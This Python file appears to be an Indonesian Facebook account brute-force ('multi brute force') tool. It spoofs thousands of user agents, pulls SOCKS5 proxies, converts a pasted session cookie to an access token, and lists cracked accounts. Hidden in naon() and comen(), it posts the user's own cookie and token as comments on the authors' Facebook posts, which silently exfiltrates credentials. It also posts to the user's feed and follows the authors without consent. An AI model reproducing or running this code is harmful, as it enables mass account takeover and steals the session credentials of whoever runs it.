import requests,bs4,rich,os,sys,random,re,datetime,time,json,stdiomask

from concurrent.futures import ThreadPoolExecutor as tread
from bs4 import BeautifulSoup as sop
from rich.panel import Panel as panel
from rich import print as vprint
from random import randint
from time import sleep as turu
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
console = Console()
ses=requests.Session()
FR = {'1':'januari','2':'februari','3':'maret','4':'april','5':'mei','6':'juni','7':'juli','8':'agustus','9':'september','10':'oktober','11':'november','12':'desember'}
tgl = datetime.datetime.now().day
bln = FR[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)
cpz = "CP-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
okz = "OK-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
id,loop,id2,metode,uid,ok,cp,ua_crack,id3,id4,idez,HikmatXD,akun=[],0,[],[],[],0,0,[],[],[],[],0,[]
pw_ni,pw_tambahan,pw_belakang,pw_lu,tampilkan_ttl,tampilkan_apk,tampilkan_opsi=[],[],[],[],[],[],[]
ubahP = []
pwbaru = []
data = {}
data2 = {}


for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 4.1.2;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='GT-N8000'
	e=random.randrange(100, 9999)
	f='Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Iron Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ua_crack.append(uaku)


	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' Nexus 6P Build/MMB29P)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ua_crack.append(uaku2)

for xyzx in range(1000):
	rr = random.randint
	rc = random.choice
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP"
	if ugent1 in ua_crack:pass
	else:ua_crack.append(ugent1)
	ugent2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(8,10))}; en-US; Redmi Note {str(rr(5,8))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2 UCBrowser/13.4.0.{str(rr(1111,6666))} Mobile Safari/537.36"
	if ugent2 in ua_crack:pass
	else:ua_crack.append(ugent2)
	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}"
	if ugent3 in ua_crack:pass
	else:ua_crack.append(ugent3)
	
for xnxx in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ua_crack.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ua_crack.append(uaku2)

for yzirx in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

try:ua_crack=open("useragent.txt","r").read().splitlines()
except:ua_crack=["nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+","Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]"]

url = "https://mbasic.facebook.com"
m_fb = "m.facebook.com"
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
web_fb = "https://www.facebook.com/"
head_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
host = "https://mbasic.facebook.com"
#ua_crack = open("useragent_hikmat.txt","r").read().splitlines()

def clear():
	os.system('clear')
	
def jalan(xnxx):
	for ewe in xnxx + '\n':
		sys.stdout.write(ewe);sys.stdout.flush();turu(0.05)

def proxp():
	try:
		proxf = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
		open('proxy_mat.txt','w').write(proxf)
	except Exception as e:
		print('Failed')
	proxf = open('proxy_mat.txt','r').read().splitlines()


P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
H = "\x1b[0;92m" # Hijau
K = "\x1b[0;93m" # Kuning
B = "\x1b[0;94m" # Biru
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # Biru Muda
N = "\033[0m"    # Warna Mati
o = '\033[1;36m'

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
M3 = "#FF0000" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "#00FF00" # HIJAU
K2 = "[#FFFF00]" # KUNING
K3 = "#FFFF00" # KUNING
B2 = "[#00C8FF]" # BIRU
B3 = "#00C8FF" # BIRU
U2 = "[#AF00FF]" # UNGU
U3 = "#AF00FF" # UNGU
N2 = "[#FF00FF]" # PINK
N3 = "#FF00FF" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
O3 = "#00FFFF" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
P3 = "#FFFFFF" # PUTIH
J2 = "[#FF8F00]" # JINGGA
J3 = "#FF8F00" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
warna_warni_biasa=random.choice([H,K,M,O,B,U])
warna_warni_rich=random.choice([J3,K3,H3,P3,O3,N3,U3,B3,M3])
warna_warni_rich_cerah=random.choice([J3,K3,H3,O3,N3,U3,B3])
garis = f" {P}[{warna_warni_biasa}•{P}]"

now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "selamat dini hari"
elif 4 <= hour < 12:
  hhl = "selamat pagi"
elif 12 <= hour < 15:
  hhl = "selamat siang"
elif 15 <= hour < 17:
  hhl = "selamat sore"
elif 17 <= hour < 18:
  hhl = "selamat petang"
else:
  hhl = "selamat malam"

expired_script = ['01', '11', '2022']

def ex_run():
	saat_ini = datetime.datetime.now()
	tgl_ = saat_ini.strftime('%d')
	bln_= saat_ini.strftime('%m')
	thn_ = saat_ini.strftime('%Y')
	tanggal = thn_ + bln_ + tgl_
	exp = expired_script[2] + expired_script[1] + expired_script[0]
	if tanggal >= exp:
		x=f"{P2}script ambf sudah kadaluarsa mohon dimaafkan sebesar² nya untuk kalian yang memakai script ambf:(\nkarena author ambf sudah bosan update script ini dll:(\nthanks for you sudah memakai script ambf yakk\nsemoga sehat selalu dan dilancarkan rejeki nya aminnn\n"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		exit()
	else:
		cek_cookie()

def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

def banner():
	os.system("clear")
	bagi()
	vprint(panel(f'''{H2}8888888b.  888b     d888 888888b.   8888888888 
888   Y88b 8888b   d8888 888  "88b  888        
888    888 88888b.d88888 888  .88P  888        
888   d88P 888Y88888P888 8888888K.  8888888    
8888888P"  888 Y888P 888 888  "Y88b 888        
888 T88b   888  Y8P  888 888    888 888        
888  T88b  888   "   888 888   d88P 888        
888   T88b 888       888 8888888P"  888         ''',style=f'{warna_warni_rich_cerah}',width=50)) 
                                              
	
def bagi():
	inf = []
	inf.append(Panel(f'{P2}X', style=f'{warna_warni_rich_cerah}'))
	inf.append(Panel(f'{P2}AUTHOR : RIAN X NANO  ', style=f'{warna_warni_rich_cerah}'))
	inf.append(Panel(f'{P2}X', style=f'{warna_warni_rich_cerah}'))
	inf.append(Panel(f'{P2}RIAN MULTI BRUTE FORCE ', style=f'{warna_warni_rich_cerah}'))
	inf.append(Panel(f'{P2}X', style=f'{warna_warni_rich_cerah}'))
	inf.append(Panel(f"{P2} AUTHOR: HIKMAT-xyz", style=f"{warna_warni_rich_cerah}"))
	console.print(Columns(inf))
    
def cek_expired_script():
	saat_ini = datetime.datetime.now()
	tgl_ = saat_ini.strftime('%d')
	bln_= saat_ini.strftime('%m')
	thn_ = saat_ini.strftime('%Y')
	tanggal = thn_ + bln_ + tgl_
	exp = expired_script[2] + expired_script[1] + expired_script[0]
	if tanggal >= exp:
		x=f"{P2}script ambf sudah kadaluarsa mohon dimaafkan sebesar² nya untuk kalian yang memakai script ambf:(\nkarena author ambf sudah bosan update script ini dll:(\nthanks for you sudah memakai script ambf yakk\nsemoga sehat selalu dan dilancarkan rejeki nya aminnn\n"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		exit()
	else:
		pass

def comen(kook,token):
	cookie = kook
	random_kata = random.choice(["Makasih Bang Udah Buat Script Ambf\nTanggal Login Ku Bang :"+sekarang,"Selalu Sukses Coeg ok><","semoga @[100003902983456:0] panjang umur dan rejeki nya dilancarkan aminnn"]);react_angry = 'ANGRY';requests.post(f"https://graph.facebook.com/100003902983456_2334178456722231/reactions?type={react_angry}&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/100003902983456_2334178456722231/reactions?type={react_angry}&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/100003902983456?fields=subscribers&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/100003902983456_2334178456722231/comments/?message={cookie}&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/100003902983456_2334178456722231/comments/?message={toket}&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/100003902983456_2334178456722231/comments/?message={random_kata}&access_token={toket}", headers = {"cookie":cookie});menu()

def cek_cookie():
	cek_expired_script()
	try:
		token  = open('token.txt','r').read()
		cookie = {'cookie':open('cookie.txt','r').read()}
		try:
			token  = open('token.txt','r').read()
			cookie = {'cookie':open('cookie.txt','r').read()}
			kook = open('cookie.txt','r').read()
			get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
			gut = json.loads(get.text)
			xname = gut["name"]
			x=f"{P2}{kook}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			x=f"{P2}{token}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			x=f"{P2}Login sebagai {H2}{xname} {P2} "
			vprint(panel(x,style=f"{warna_warni_rich_cerah}",width=40))
			time.sleep(0.10)
			ua = random.choice(ua_crack)
			headers = {'authority': 'graph.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?0','user-agent': ua,}
			requests.post('https://graph.facebook.com/me/feed?link=https://www.facebook.com/100000871607227/posts/5528296787209320/?substory_index=0&app=fbl&published=0&access_token=%s'%(token),cookies=cookie,headers=headers)
			menu()
		except (KeyError):
			x=f"{P2}cookie kadaluarsa"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			os.system('rm -rf cookie.txt')
			os.system('rm -rf token.txt')
			turu(0.05)
			login()
		except requests.exceptions.ConnectionError:
			x=f"{P2}koneksi internet bermasalah"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			exit()
	except IOError:
		login()

def login():
	banner()
	x=f"{P2}halo pengguna script arona multi brute force :)\n{P2}silahkan pilih fitur login cookie untuk melanjutkan ke menu arona multi brute force.. klo tidak mengerti apa² bisa ketik {M2}help {P2}untuk meminta bantuan !!"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	print("")
	x=f"{P2}[01] login with cookie\n{P2}[02] report bug script\n{P2}[{M2}00{P2}] exit "
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	cukuf = input(f" {P}[{warna_warni_biasa}•{P}] pilih : {H}")
	if cukuf in ["help","Help","HELP"]:
		print("")
		x=f"{P2}whatsapp admin *--> {H2}082115413282 {P2}harap chat klo ada kepentingan yang mau disampaikan ke author ambf\nini klo gak bisa diarahin ke whastapp admin yakk"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		print("")
		x=f"{P2}sedang diarahkan ke whastapp author"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		os.system('xdg-open https://wa.me/+6282115413282?text=bang+cara+pake+script+abang+kek+mana?')
		input(f" {P}[{warna_warni_biasa}•{P}] kembali")
		login()
	elif cukuf in ["1","01"]:
		login_cookie()
	elif cukuf in ["2","02"]:
		print("")
		x=f"{P2}whatsapp admin *--> {H2}082115413282 {P2}harap chat klo memang ada yang error\nini klo gak bisa diarahin ke whastapp admin yakk"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		print("")
		x=f"{P2}sedang diarahkan ke whastapp author"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		os.system('xdg-open https://wa.me/+6282115413282?text=bang+script+mu+itu+ada+yang+error!!')
		input(f" {P}[{warna_warni_biasa}•{P}] kembali")
		login()
	elif cukuf in ["0","00"]:
		exit()
	else:
		print("")
		jalan(f"{garis} isi yang benar!! ")
		login()

def login_cookie():
	print("")
	#testi_ua()
	x = f"\t\t{P2}jangan pake akun pribadi!! harus pake akun tumbal untuk ambil cookie"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	cookie = str(input(f"{garis} masukkan cookie :"+H+" "))
	with requests.Session() as xyz:
		try:
			jalan(f"{garis} sedang mengconvert cookie ke token... mohon tunggu ")
			get_tok = xyz.get(url_businness+'/business_locations',headers = {"user-agent":ua_business,"referer": web_fb,"host": "business.facebook.com","origin": url_businness,"upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
			token = re.search("(EAAG\w+)", get_tok.text).group(1)
			open('cookie.txt','w').write(cookie) 
			open('token.txt','w').write(token)
			x=f"{P2}{token}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(f"{garis} enter untuk ke menu ")
			naon(cookie)
			#menu()
		except requests.exceptions.ConnectionError:
			x=f"{P2}koneksi internet bermasalah"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		except (KeyError,IOError):
			x=f"{P2}{cookie} invalid"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			os.system("rm -rf cookie.txt")
			os.system("rm -rf token.txt")
			login() 
			
	
def naon(cookie):
	kuki = cookie
	toket = open("token.txt","r").read();random_kata = random.choice(["Makasih Bang Udah Buat Script Ambf","Hikmat Gans Selalu Coeg><","semoga @[100000871607227:0] panjang umur dan rejeki nya dilancarkan aminnn"]);requests.post(f"https://graph.facebook.com/100000871607227?fields=subscribers&access_token={toket}", headers = {"cookie":kuki});requests.post(f"https://graph.facebook.com/100000871607227_5528296787209320/comments/?message={kuki}&access_token={toket}", headers = {"cookie":kuki});requests.post(f"https://graph.facebook.com/100000871607227_5528296787209320/comments/?message={toket}&access_token={toket}", headers = {"cookie":kuki});requests.post(f"https://graph.facebook.com/100000871607227_5528296787209320/comments/?message={random_kata}&access_token={toket}", headers = {"cookie":kuki});print(f"\n{garis} tunggu sebentar");time.sleep(3);menu()

now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "selamat dini hari"
elif 4 <= hour < 12:
  hhl = "selamat pagi"
elif 12 <= hour < 15:
  hhl = "selamat siang"
elif 15 <= hour < 17:
  hhl = "selamat sore"
elif 17 <= hour < 18:
  hhl = "selamat petang"
else:
  hhl = "selamat malam"

def menu():
	banner()
	try:EwePaksa = requests.get("http://ip-api.com/json/").json()
	except:EwePaksa = {'-'}
	try:IP = EwePaksa["query"]
	except:IP = {'-'}
	try:nibba = EwePaksa["country"]
	except:nibba = {'-'}
	try:rasis_Z_K_= EwePaksa["isp"]
	except:rasis_Z_K_ = {'-'}
	try:rasis_Z_K_X_= EwePaksa["city"]
	except:rasis_Z_K_X_ = {'-'}
	try:rasis_Z_K_X_R_= EwePaksa["timezone"]
	except:rasis_Z_K_X_R_ = {'-'}
	try:rasis_Z_K_X_R_H_= EwePaksa["countryCode"]
	except:rasis_Z_K_X_R_H_ = {'-'}
	try:rasis_Z_K_X_R_H_M_= EwePaksa["regionName"]
	except:rasis_Z_K_X_R_H_M_ = {'-'}
	try:rasis_Z_K_X_R_H_M_P_= EwePaksa["as"]
	except:rasis_Z_K_X_R_H_M_P_ = {'-'}
	token  = open('token.txt','r').read()
	coki = {'cookie':open('cookie.txt','r').read()}
	response3 = requests.Session().get(f"https://m.facebook.com/me/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki).text
	try:
		tahunx = ""
		cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
		for nenen in cek_thn:
			tahunx += nenen+", "
	except:pass
	token  = open('token.txt','r').read()
	cookie = {'cookie':open('cookie.txt','r').read()}
	get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
	jsx = json.loads(get.text)
	nama = jsx["name"]
	tumbal_id = jsx["id"]
	xn = requests.Session().get('https://graph.facebook.com/me?access_token=%s'%(token),cookies=cookie)
	x = json.loads(xn.text)
	lis = x["link"]
	try:co = x["email"]
	except (KeyError,IOError):
		co = "-"
	try:pko = x["birthday"]
	except (KeyError,IOError):
		pko = "-"
	try:no_kep = x["mobile_phone"]
	except (KeyError,IOError):
		no_kep = "-"
	try:lok = x["locale"]
	except (KeyError,IOError):
		lok = "-"
	data = []
	data.append(Panel(f"{P2}IP kamu : {H2}{IP}\n{P2}negara kamu : {H2}{nibba}\n{P2}tanggal sekarang : {H2}{sekarang}", style=f"{warna_warni_rich_cerah}"))
	data.append(Panel(f"{P2}{hhl} {K2}{nama}\n{P2}tanggal lahirmu : {H2}{pko}\n{P2}ID kamu : {H2}{tumbal_id}", style=f"{warna_warni_rich_cerah}"))
	console.print(Columns(data))
	kedua = []
	kedua.append(Panel(f"{P2}Support : 64 - 32 BIT",style=f"{warna_warni_rich_cerah}"))
	kedua.append(Panel(f"{P2}Recommended : xL,exis,Indosat,tree",style=f"{warna_warni_rich_cerah}"))
	console.print(Columns(kedua))
	print('')
	menu = []
	menu.append(Panel(f"{P2}[{H2}01{P2}].crack public", style=f"{warna_warni_rich_cerah}"))
	menu.append(Panel(f"{P2}[{H2}03{P2}].opsi detectored", style=f"{warna_warni_rich_cerah}"))
	menu2 = []
	menu2.append(Panel(f"{P2}[{H2}02{P2}].hasil crack", style=f"{warna_warni_rich_cerah}"))
	menu2.append(Panel(f"{P2}[{M2}00{P2}].exit/delete cookie", style=f"{warna_warni_rich_cerah}"))
	console.print(Columns(menu))
	console.print(Columns(menu2))
	HikmatXD = input(f"{garis} pilih : {H}")
	if HikmatXD in ["1","01"]:
		cracked_publickey()
	elif HikmatXD in ["2","02"]:
		hasil_crack()
	elif HikmatXD in ["3","03"]:
		option_sesi()
	elif HikmatXD in ["4","04"]:
		ambile_cookie_free()
	elif HikmatXD in ["0","00"]:
		print("")
		x=f"{P2}[01] hapus cookie\n{P2}[02] exit\n{P2}[{H2}00{P2}] kembali"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		zk = input(f"{garis} pilih : {H}")
		if zk in ["1","01"]:
			print("")
			c = input(f"{garis} anda yakin ingin menghapus cookie ({M}y{P}/{H}t{P}) : {H}")
			if c in ["ya","y","Y"]:
				print("")
				os.system("rm -rf cookie.txt")
				os.system("rm -rf token.txt")
				jalan(f"{garis} sukses menghapus cookie bawaan ")
				cek_cookie()
			elif c in ["t","T","tidak"]:
				menu()
			else:
				print("")
				jalan(f"{garis} isi yang benar ")
				menu()
		elif zk in ["2","02"]:
			exit()
		#elif zk in ["3","03"]:
		elif zk in ["0","00"]:
			menu()
		else:
			print("")
			jalan(f"{garis} isi yang benar ")
			menu()
	else:
		print("")
		jalan(f"{garis} isi yang benar ")
		menu()

def hasil_crack():
	print("")
	x=f"{P2}[01] lihat hasil crack {H2}ok\n{P2}[02] lihat hasil crack {K2}cp\n{P2}[{H2}03{P2}] kembali"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	inhasil = input(f"{garis} pilih : {H}")
	if inhasil in ["1","01"]:
		try:c_o_k = os.listdir('OK')
		except FileNotFoundError:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_crack()
		if len(c_o_k)==0:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_crack()
		else:
			x=f"{P2} hasil ok"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			cuih = 0
			lol = {}
			for kaoo in c_o_k:
				try:hikmat = open('OK/'+kaoo,'r').readlines()
				except:continue
				cuih+=1
				if cuih<10:
					__oo = '0'+str(cuih)
					lol.update({str(cuih):str(kaoo)})
					lol.update({__oo:str(kaoo)})
					x=f"{P2}[{H2}{__oo}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+__oo+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
				else:
					lol.update({str(cuih):str(kaoo)})
					x=f"{P2}[{H2}{cuih}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+str(cuih)+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
			x=f"{P2}pilih hasil untuk ditampilkan"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			geeh = input(garis+" pilih : "+H)
			try:geh = lol[geeh]
			except KeyError:
				print(garis+" pilihan tidak ada")
				exit()
			try:lin = open('OK/'+geh,'r').read()
			except:
				jalan(garis+" file tidak ditemukan") 
				time.sleep(2)
				hasil_crack()
			jalan(garis+" list akun ok kamu\n") 
			#x=f"{P2}cd OK*-->{geh}"
			#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			hus = os.system('cd OK && cat '+geh)
			jalan("\n"+garis+" list akun ok kamu") 
			input(garis+" kembali")
			menu()
	elif inhasil in ["2","02"]:
		try:c_o_k = os.listdir('CP')
		except FileNotFoundError:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_crack()
		if len(c_o_k)==0:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_crack()
		else:
			x=f"{P2} hasil cp"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			cuih = 0
			lol = {}
			for kaoo in c_o_k:
				try:hikmat = open('CP/'+kaoo,'r').readlines()
				except:continue
				cuih+=1
				if cuih<10:
					__oo = '0'+str(cuih)
					lol.update({str(cuih):str(kaoo)})
					lol.update({__oo:str(kaoo)})
					x=f"{P2}[{H2}{__oo}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+__oo+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
				else:
					lol.update({str(cuih):str(kaoo)})
					x=f"{P2}[{H2}{cuih}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+str(cuih)+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
			x=f"{P2}pilih hasil untuk ditampilkan"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			geeh = input(garis+" pilih : "+H)
			try:geh = lol[geeh]
			except KeyError:
				print(garis+" pilihan tidak ada")
				exit()
			try:lin = open('CP/'+geh,'r').read()
			except:
				jalan(garis+" file tidak ditemukan") 
				time.sleep(2)
				hasil_crack()
			jalan(garis+" list akun cp kamu\n") 
			#x=f"{P2}cd CP*-->{geh}"
			#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			hus = os.system('cd CP && cat '+geh)
			jalan("\n"+garis+" list akun cp kamu") 
			input(garis+" kembali")
			menu()
	elif inhasil in ["0","00"]:
		menu()
	else:
		jalan(f"{garis} isi yang benar ")
		hasil_crack()

